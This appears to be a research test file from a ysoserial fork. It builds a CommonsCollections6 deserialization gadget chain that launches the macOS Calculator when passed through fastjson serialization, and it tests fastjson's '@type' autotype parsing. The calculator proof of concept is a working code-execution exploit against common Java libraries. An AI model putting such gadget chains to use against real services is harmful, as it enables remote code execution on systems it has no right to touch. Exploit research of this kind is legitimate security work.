package ysoserial.exploit.fastjson;

import com.alibaba.fastjson.JSON;
import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections1;
import ysoserial.payloads.CommonsCollections6;

import java.io.Serializable;

/**
 * @ClassName: FastJsonTest
 * @Description: ToDo
 * @Author: angelwhu
 * @Create: 2019/05/11 17:12
 **/
public class FastJsonTest {

    public static void main1() throws Exception {
        CommonsCollections6 payload = new CommonsCollections6();
        Object serializable = payload.getObjectExec("/Applications/Calculator.app/Contents/MacOS/Calculator");

//        CommonsCollections1 payload = new CommonsCollections1();
//        Object serializable = payload.getObject("/Applications/Calculator.app/Contents/MacOS/Calculator");

//        byte[] bytes = Serializer.serialize(serializable);
//
        String fastjsonString = JSON.toJSONString(serializable); //这步骤会弹计算器，神奇～ 有遍历Map的操作，就弹了。序列化方法不一样。 @angelwhu
//        System.out.println(fastjsonString);
//
//        JSON.parseObject(fastjsonString);
    }

    public static void main2() throws Exception {
//        User user = new User();
//        user.setName("angelwhu");
//        user.setAge(12);
//
//        System.out.println(JSON.toJSONString(user));

        //String jsonString = "{\"@type\":\"ysoserial.exploit.fastjson.User\",\"age\":12,\"name\":\"angelwhu\"}";
        String jsonString = "{\"@type\":\"ysoserial.exploit.fastjson.User\",\"name\":\"angelwhu\"}";
        User object = JSON.parseObject(jsonString, User.class);
        System.out.println(object);
        /**
         * 调用construct user()
         * setAge()
         * setName()
         */
        JSON.parseObject(jsonString);

//        Object object = JSON.parseObject(jsonString);
//        System.out.println(object);
        /**
         * 调用:construct user()
         * setAge()
         * setName()
         * getAge()
         * getName()
         *
         */
    }

    public static void main(String[] args) throws Exception {
        main1();
    }
}
